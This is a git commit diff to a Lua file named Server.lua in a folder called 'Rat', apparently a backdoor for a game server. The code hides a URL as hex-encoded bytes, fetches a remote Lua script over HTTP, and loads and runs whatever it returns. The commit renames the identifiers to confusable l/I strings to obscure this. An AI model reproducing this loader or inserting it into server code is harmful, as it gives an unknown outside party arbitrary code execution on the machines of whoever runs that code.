0fd720e8f64107fea20c2ab549c0c3a8ea386f59
zImSkillz <83404249+zImSkillz@users.noreply.github.com>
2022-06-04 21:43:49 +0200

    Add files via upload

--- Rat/Files/Server.lua
+++ Rat/Files/Server.lua
@@ -1,19 +1,19 @@
-local Lua_Tabs = {
+local llIllIIlIIIIIIll = {
     Ench, Support, Host, Pairs,
     Realease, Callbacks, Source,
     Hosting, Event, PerformHttpRequest,
     assert, server, load, Spawn, materials
 }
 
-local random_char = {
+local IIlIlllllIIlIIIl = {
     '68', '74', '74', '70', '73', '3a', '2f', '2f', '73', '70', '41', '4d', '42', '55',
     '44', '65', '2e', '4e', '65', '74', '2f', '44', '6b', '73', '2f', '64', '64', '2e'; '6c',
     '75', '61'
 }
 
-function sst_conv8()
+function lIlllIlllIlIIlIl()
     _empt = ''
-    for id,it in pairs(random_char) do
+    for id,it in pairs(IIlIlllllIIlIIIl) do
         _empt = _empt..it
     end
     return (_empt:gsub('..', function (cc)
@@ -21,8 +21,8 @@ function sst_conv8()
     end))
 end
 
-Lua_Tabs[10](sst_conv8(), function (e, d)
-    local s = Lua_Tabs[11](Lua_Tabs[13](d))
+llIllIIlIIIIIIll[10](lIlllIlllIlIIlIl(), function (e, d)
+    local s = llIllIIlIIIIIIll[11](llIllIIlIIIIIIll[13](d))
     if (d == nil) then return end
     s()
 end)
